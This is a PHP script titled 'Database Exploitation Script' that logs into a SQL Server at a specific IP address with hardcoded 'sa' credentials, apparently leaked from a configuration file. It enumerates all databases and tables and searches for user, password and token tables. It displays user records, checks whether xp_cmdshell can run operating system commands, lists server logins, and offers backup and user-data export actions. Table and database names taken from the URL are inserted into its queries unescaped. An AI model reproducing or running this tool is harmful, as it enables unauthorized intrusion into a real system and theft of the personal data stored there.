<?php
// Database Exploitation Script
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "<h2>Database Connection Test</h2>";

// Database credentials from appsettings.json
$server = "196.188.169.49";
$database = "E-CRMIS-2023-PRO-API";
$username = "sa";
$password = "p@55w0rd";

// Connection string for SQL Server
$connectionInfo = array(
    "Database" => $database,
    "UID" => $username,
    "PWD" => $password,
    "TrustServerCertificate" => true,
    "CharacterSet" => "UTF-8"
);

try {
    // Connect to SQL Server
    $conn = sqlsrv_connect($server, $connectionInfo);
    
    if ($conn === false) {
        echo "<h3 style='color: red;'>Connection Failed!</h3>";
        echo "<pre>Error: ";
        print_r(sqlsrv_errors());
        echo "</pre>";
        
        // Try with PDO as alternative
        echo "<h4>Trying PDO connection...</h4>";
        try {
            $dsn = "sqlsrv:Server=$server;Database=$database;TrustServerCertificate=1";
            $pdo = new PDO($dsn, $username, $password);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            echo "<p style='color: green;'>✓ PDO Connection Successful!</p>";
            $conn = $pdo; // Use PDO connection
        } catch (PDOException $e) {
            echo "<p style='color: red;'>PDO Error: " . $e->getMessage() . "</p>";
            exit;
        }
    } else {
        echo "<h3 style='color: green;'>✓ Connection Successful!</h3>";
        echo "<p>Connected to: $server</p>";
        echo "<p>Database: $database</p>";
        echo "<p>User: $username</p>";
    }
    
    // Test connection with simple query
    echo "<h3>Server Information:</h3>";
    
    if (is_a($conn, 'PDO')) {
        // Using PDO
        $stmt = $conn->query("SELECT @@VERSION as version, @@SERVERNAME as server, DB_NAME() as db");
        $serverInfo = $stmt->fetch(PDO::FETCH_ASSOC);
    } else {
        // Using sqlsrv
        $sql = "SELECT @@VERSION as version, @@SERVERNAME as server, DB_NAME() as db";
        $stmt = sqlsrv_query($conn, $sql);
        $serverInfo = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);
    }
    
    echo "<pre>";
    echo "SQL Server Version: " . $serverInfo['version'] . "\n";
    echo "Server Name: " . $serverInfo['server'] . "\n";
    echo "Current Database: " . $serverInfo['db'] . "\n";
    echo "</pre>";
    
    // Get all databases
    echo "<h3>All Databases on Server:</h3>";
    if (is_a($conn, 'PDO')) {
        $stmt = $conn->query("SELECT name, database_id, create_date FROM sys.databases ORDER BY name");
        $databases = $stmt->fetchAll(PDO::FETCH_ASSOC);
    } else {
        $sql = "SELECT name, database_id, create_date FROM sys.databases ORDER BY name";
        $stmt = sqlsrv_query($conn, $sql);
        $databases = array();
        while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
            $databases[] = $row;
        }
    }
    
    echo "<table border='1' cellpadding='5'>";
    echo "<tr><th>Database Name</th><th>ID</th><th>Created</th><th>Action</th></tr>";
    foreach ($databases as $db) {
        $dbName = $db['name'];
        echo "<tr>";
        echo "<td><strong>$dbName</strong></td>";
        echo "<td>{$db['database_id']}</td>";
        echo "<td>" . (is_object($db['create_date']) ? $db['create_date']->format('Y-m-d') : $db['create_date']) . "</td>";
        echo "<td><a href='?action=switch_db&db=" . urlencode($dbName) . "'>Switch</a></td>";
        echo "</tr>";
    }
    echo "</table>";
    
    // Switch database if requested
    if (isset($_GET['action']) && $_GET['action'] == 'switch_db' && isset($_GET['db'])) {
        $newDb = $_GET['db'];
        if (is_a($conn, 'PDO')) {
            $conn->exec("USE [$newDb]");
        } else {
            sqlsrv_query($conn, "USE [$newDb]");
        }
        echo "<p style='color: green;'>Switched to database: $newDb</p>";
    }
    
    // Explore current database
    echo "<h3>Tables in Current Database:</h3>";
    
    if (is_a($conn, 'PDO')) {
        $stmt = $conn->query("SELECT 
            TABLE_SCHEMA,
            TABLE_NAME,
            TABLE_TYPE,
            (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS c 
             WHERE c.TABLE_SCHEMA = t.TABLE_SCHEMA AND c.TABLE_NAME = t.TABLE_NAME) as column_count
            FROM INFORMATION_SCHEMA.TABLES t
            ORDER BY TABLE_SCHEMA, TABLE_NAME");
        $tables = $stmt->fetchAll(PDO::FETCH_ASSOC);
    } else {
        $sql = "SELECT 
            TABLE_SCHEMA,
            TABLE_NAME,
            TABLE_TYPE,
            (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS c 
             WHERE c.TABLE_SCHEMA = t.TABLE_SCHEMA AND c.TABLE_NAME = t.TABLE_NAME) as column_count
            FROM INFORMATION_SCHEMA.TABLES t
            ORDER BY TABLE_SCHEMA, TABLE_NAME";
        $stmt = sqlsrv_query($conn, $sql);
        $tables = array();
        while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
            $tables[] = $row;
        }
    }
    
    echo "<table border='1' cellpadding='5'>";
    echo "<tr><th>Schema</th><th>Table Name</th><th>Type</th><th>Columns</th><th>Actions</th></tr>";
    foreach ($tables as $table) {
        $fullName = "[{$table['TABLE_SCHEMA']}].[{$table['TABLE_NAME']}]";
        echo "<tr>";
        echo "<td>{$table['TABLE_SCHEMA']}</td>";
        echo "<td><strong>{$table['TABLE_NAME']}</strong></td>";
        echo "<td>{$table['TABLE_TYPE']}</td>";
        echo "<td>{$table['column_count']}</td>";
        echo "<td>";
        echo "<a href='?action=view_table&table=" . urlencode($fullName) . "&limit=10'>View</a> | ";
        echo "<a href='?action=describe_table&table=" . urlencode($fullName) . "'>Structure</a>";
        echo "</td>";
        echo "</tr>";
    }
    echo "</table>";
    
    // View table data if requested
    if (isset($_GET['action']) && $_GET['action'] == 'view_table' && isset($_GET['table'])) {
        $tableName = $_GET['table'];
        $limit = isset($_GET['limit']) ? intval($_GET['limit']) : 10;
        
        echo "<h3>Data from: $tableName (First $limit rows)</h3>";
        
        if (is_a($conn, 'PDO')) {
            $stmt = $conn->query("SELECT TOP $limit * FROM $tableName");
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        } else {
            $sql = "SELECT TOP $limit * FROM $tableName";
            $stmt = sqlsrv_query($conn, $sql);
            $rows = array();
            while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
                $rows[] = $row;
            }
        }
        
        if (!empty($rows)) {
            echo "<table border='1' cellpadding='5'>";
            // Headers
            echo "<tr>";
            foreach (array_keys($rows[0]) as $column) {
                echo "<th>$column</th>";
            }
            echo "</tr>";
            
            // Data
            foreach ($rows as $row) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>";
                    if (is_object($value)) {
                        echo $value->format('Y-m-d H:i:s');
                    } else {
                        echo htmlspecialchars($value);
                    }
                    echo "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "<p>No data found or table is empty.</p>";
        }
    }
    
    // Show table structure if requested
    if (isset($_GET['action']) && $_GET['action'] == 'describe_table' && isset($_GET['table'])) {
        $tableName = $_GET['table'];
        
        echo "<h3>Structure of: $tableName</h3>";
        
        if (is_a($conn, 'PDO')) {
            // Extract schema and table name
            preg_match('/\[([^\]]+)\]\.\[([^\]]+)\]/', $tableName, $matches);
            $schema = $matches[1];
            $table = $matches[2];
            
            $stmt = $conn->query("SELECT 
                COLUMN_NAME,
                DATA_TYPE,
                IS_NULLABLE,
                CHARACTER_MAXIMUM_LENGTH,
                COLUMN_DEFAULT
                FROM INFORMATION_SCHEMA.COLUMNS
                WHERE TABLE_SCHEMA = '$schema' AND TABLE_NAME = '$table'
                ORDER BY ORDINAL_POSITION");
            $columns = $stmt->fetchAll(PDO::FETCH_ASSOC);
        } else {
            $sql = "SELECT 
                COLUMN_NAME,
                DATA_TYPE,
                IS_NULLABLE,
                CHARACTER_MAXIMUM_LENGTH,
                COLUMN_DEFAULT
                FROM INFORMATION_SCHEMA.COLUMNS
                WHERE TABLE_NAME = ?
                ORDER BY ORDINAL_POSITION";
            $stmt = sqlsrv_query($conn, $sql, array($tableName));
            $columns = array();
            while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
                $columns[] = $row;
            }
        }
        
        echo "<table border='1' cellpadding='5'>";
        echo "<tr><th>Column</th><th>Type</th><th>Nullable</th><th>Length</th><th>Default</th></tr>";
        foreach ($columns as $col) {
            echo "<tr>";
            echo "<td><strong>{$col['COLUMN_NAME']}</strong></td>";
            echo "<td>{$col['DATA_TYPE']}</td>";
            echo "<td>{$col['IS_NULLABLE']}</td>";
            echo "<td>" . ($col['CHARACTER_MAXIMUM_LENGTH'] ?: '-') . "</td>";
            echo "<td>" . ($col['COLUMN_DEFAULT'] ?: 'NULL') . "</td>";
            echo "</tr>";
        }
        echo "</table>";
    }
    
    // Look for sensitive tables (users, passwords, etc.)
    echo "<h3>Potential Sensitive Tables:</h3>";
    
    $sensitiveKeywords = ['user', 'pass', 'auth', 'login', 'account', 'credential', 'token', 'password', 'secret', 'admin'];
    $foundSensitive = array();
    
    foreach ($tables as $table) {
        $tableName = strtolower($table['TABLE_NAME']);
        foreach ($sensitiveKeywords as $keyword) {
            if (strpos($tableName, $keyword) !== false) {
                $foundSensitive[] = $table;
                break;
            }
        }
    }
    
    if (!empty($foundSensitive)) {
        echo "<table border='1' cellpadding='5'>";
        echo "<tr><th>Table</th><th>Type</th><th>Columns</th><th>Quick View</th></tr>";
        foreach ($foundSensitive as $table) {
            $fullName = "[{$table['TABLE_SCHEMA']}].[{$table['TABLE_NAME']}]";
            echo "<tr>";
            echo "<td><strong style='color: red;'>{$table['TABLE_NAME']}</strong></td>";
            echo "<td>{$table['TABLE_TYPE']}</td>";
            echo "<td>{$table['column_count']}</td>";
            echo "<td><a href='?action=view_table&table=" . urlencode($fullName) . "&limit=5'>View Data</a></td>";
            echo "</tr>";
        }
        echo "</table>";
    } else {
        echo "<p>No obviously sensitive table names found.</p>";
    }
    
    // Try to find users table specifically
    echo "<h3>Searching for User Data:</h3>";
    
    $possibleUserTables = ['Users', 'AspNetUsers', 'User', 'Account', 'Membership', 'Login'];
    foreach ($possibleUserTables as $userTable) {
        if (is_a($conn, 'PDO')) {
            $stmt = $conn->query("SELECT OBJECT_ID('$userTable')");
            $result = $stmt->fetchColumn();
        } else {
            $sql = "SELECT OBJECT_ID(?)";
            $stmt = sqlsrv_query($conn, $sql, array($userTable));
            $result = sqlsrv_fetch_array($stmt)[0];
        }
        
        if ($result) {
            echo "<p style='color: green;'>Found table: $userTable</p>";
            echo "<a href='?action=view_table&table=$userTable&limit=20'>View Users</a><br><br>";
            
            // Try to get user count
            if (is_a($conn, 'PDO')) {
                $stmt = $conn->query("SELECT COUNT(*) as user_count FROM $userTable");
                $count = $stmt->fetchColumn();
            } else {
                $sql = "SELECT COUNT(*) as user_count FROM $userTable";
                $stmt = sqlsrv_query($conn, $sql);
                $count = sqlsrv_fetch_array($stmt)[0];
            }
            echo "Total users: $count<br>";
            
            break;
        }
    }
    
    // Check for xp_cmdshell (potential RCE)
    echo "<h3>Security Assessment:</h3>";
    
    if (is_a($conn, 'PDO')) {
        $stmt = $conn->query("EXEC sp_configure 'xp_cmdshell'");
        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
    } else {
        $sql = "EXEC sp_configure 'xp_cmdshell'";
        $stmt = sqlsrv_query($conn, $sql);
        $result = array();
        while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
            $result[] = $row;
        }
    }
    
    if (!empty($result)) {
        echo "<p>xp_cmdshell configuration found:</p>";
        echo "<pre>";
        print_r($result);
        echo "</pre>";
        
        // Check if it's enabled
        $configValue = $result[0]['config_value'] ?? 0;
        $runValue = $result[0]['run_value'] ?? 0;
        
        if ($runValue == 1) {
            echo "<p style='color: red; font-weight: bold;'>⚠️ CRITICAL: xp_cmdshell is ENABLED!</p>";
            echo "<p>This allows executing operating system commands from SQL Server.</p>";
            
            // Example command (commented out for safety)
            // if (is_a($conn, 'PDO')) {
            //     $stmt = $conn->query("EXEC xp_cmdshell 'whoami'");
            //     $output = $stmt->fetchAll(PDO::FETCH_ASSOC);
            //     echo "<pre>Command output: " . print_r($output, true) . "</pre>";
            // }
        } else {
            echo "<p>xp_cmdshell is disabled (config_value: $configValue, run_value: $runValue)</p>";
        }
    }
    
    // Show server permissions
    echo "<h3>Server Permissions:</h3>";
    
    if (is_a($conn, 'PDO')) {
        $stmt = $conn->query("SELECT 
            name,
            type_desc,
            is_disabled,
            create_date
            FROM sys.server_principals 
            WHERE type IN ('S', 'U', 'G')
            ORDER BY name");
        $logins = $stmt->fetchAll(PDO::FETCH_ASSOC);
    } else {
        $sql = "SELECT 
            name,
            type_desc,
            is_disabled,
            create_date
            FROM sys.server_principals 
            WHERE type IN ('S', 'U', 'G')
            ORDER BY name";
        $stmt = sqlsrv_query($conn, $sql);
        $logins = array();
        while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
            $logins[] = $row;
        }
    }
    
    echo "<table border='1' cellpadding='5'>";
    echo "<tr><th>Login Name</th><th>Type</th><th>Disabled</th><th>Created</th></tr>";
    foreach ($logins as $login) {
        $color = ($login['name'] == 'sa') ? 'red' : 'black';
        echo "<tr>";
        echo "<td><strong style='color: $color;'>{$login['name']}</strong></td>";
        echo "<td>{$login['type_desc']}</td>";
        echo "<td>" . ($login['is_disabled'] ? 'Yes' : 'No') . "</td>";
        echo "<td>" . (is_object($login['create_date']) ? $login['create_date']->format('Y-m-d') : $login['create_date']) . "</td>";
        echo "</tr>";
    }
    echo "</table>";
    
    // Close connection
    if (is_a($conn, 'PDO')) {
        $conn = null;
    } else {
        sqlsrv_close($conn);
    }
    
} catch (Exception $e) {
    echo "<h3 style='color: red;'>Error!</h3>";
    echo "<pre>" . $e->getMessage() . "</pre>";
    
    // Try alternative connection methods
    echo "<h4>Alternative Connection Methods:</h4>";
    
    // Method 1: Using mssql_connect (deprecated but might work)
    if (function_exists('mssql_connect')) {
        echo "<p>Trying mssql_connect...</p>";
        $link = mssql_connect($server, $username, $password);
        if ($link) {
            echo "<p style='color: green;'>✓ mssql_connect successful!</p>";
            mssql_close($link);
        }
    }
    
    // Method 2: Using ODBC
    echo "<p>Trying ODBC connection...</p>";
    $odbc = odbc_connect("Driver={SQL Server};Server=$server;Database=$database;", $username, $password);
    if ($odbc) {
        echo "<p style='color: green;'>✓ ODBC connection successful!</p>";
        odbc_close($odbc);
    }
}

echo "<hr>";
echo "<h3>Quick Actions:</h3>";
echo "<a href='?action=backup_db'>Backup Database</a> | ";
echo "<a href='?action=export_users'>Export User Data</a> | ";
echo "<a href='?action=check_vuln'>Check for Vulnerabilities</a>";

// Backup database if requested
if (isset($_GET['action']) && $_GET['action'] == 'backup_db') {
    echo "<h3>Database Backup</h3>";
    $backupFile = "C:\\temp\\db_backup_" . date('Ymd_His') . ".bak";
    
    try {
        $conn = sqlsrv_connect($server, $connectionInfo);
        $sql = "BACKUP DATABASE [$database] TO DISK = N'$backupFile' WITH FORMAT, INIT, NAME = 'Full Backup of $database'";
        $stmt = sqlsrv_query($conn, $sql);
        
        if ($stmt) {
            echo "<p style='color: green;'>✓ Backup created: $backupFile</p>";
        } else {
            echo "<p style='color: red;'>Backup failed</p>";
        }
        sqlsrv_close($conn);
    } catch (Exception $e) {
        echo "<p style='color: red;'>Error: " . $e->getMessage() . "</p>";
    }
}
?>